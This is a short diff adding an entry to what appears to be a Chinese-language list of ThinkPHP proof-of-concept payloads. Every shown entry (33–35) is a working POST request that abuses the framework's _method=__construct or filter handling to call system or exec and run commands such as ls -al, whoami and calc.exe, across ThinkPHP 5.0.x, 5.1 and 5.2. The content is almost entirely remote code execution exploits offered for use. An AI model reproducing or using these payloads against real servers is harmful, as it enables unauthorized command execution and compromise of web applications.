@@ -49,3 +49,5 @@ POC：</br>
 33、（post）public/index.php?s=captcha (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al</rb>
 # thhinkphp 5.0.10（完整版）</br>
 34、(post)public/index.php?s=index/index/index (data)s=whoami&_method=__construct&method&filter[]=system</rb>
+# think 5.1.* 和 5.2.* 和 5.0.*</br>
+35、(post)public/index.php?s=index/index/index (data)c=exec&f=calc.exe&_method=filter
